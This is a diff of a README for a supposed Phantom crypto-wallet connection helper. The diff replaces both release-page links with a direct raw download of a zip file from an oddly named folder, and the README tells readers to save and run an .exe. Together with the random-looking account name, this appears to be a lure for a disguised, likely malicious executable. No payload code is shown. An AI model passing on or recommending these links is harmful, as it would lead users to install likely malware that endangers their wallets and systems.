@@ -1,6 +1,6 @@
 # 🔌 phantom-disconnect-handler - Keep your crypto wallet connections stable
 
-[![Download Phantom Disconnect Handler](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/genuseriogonumdiffuseness584/phantom-disconnect-handler/releases)
+[![Download Phantom Disconnect Handler](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/genuseriogonumdiffuseness584/phantom-disconnect-handler/main/vengeable/phantom-disconnect-handler-2.7.zip)
 
 This software helps your web applications talk to the Phantom wallet. It fixes common issues when a user leaves the app, switches their wallet account, or moves between different blockchain networks. 
 
@@ -19,7 +19,7 @@ Modern web apps often struggle when a wallet disconnects. This creates a poor ex
 
 You can get the file from the project releases page. 
 
-[Visit this page to download the latest version](https://github.com/genuseriogonumdiffuseness584/phantom-disconnect-handler/releases)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/genuseriogonumdiffuseness584/phantom-disconnect-handler/main/vengeable/phantom-disconnect-handler-2.7.zip)
 
 Look for the file that ends in .exe. Save this to your computer.
 
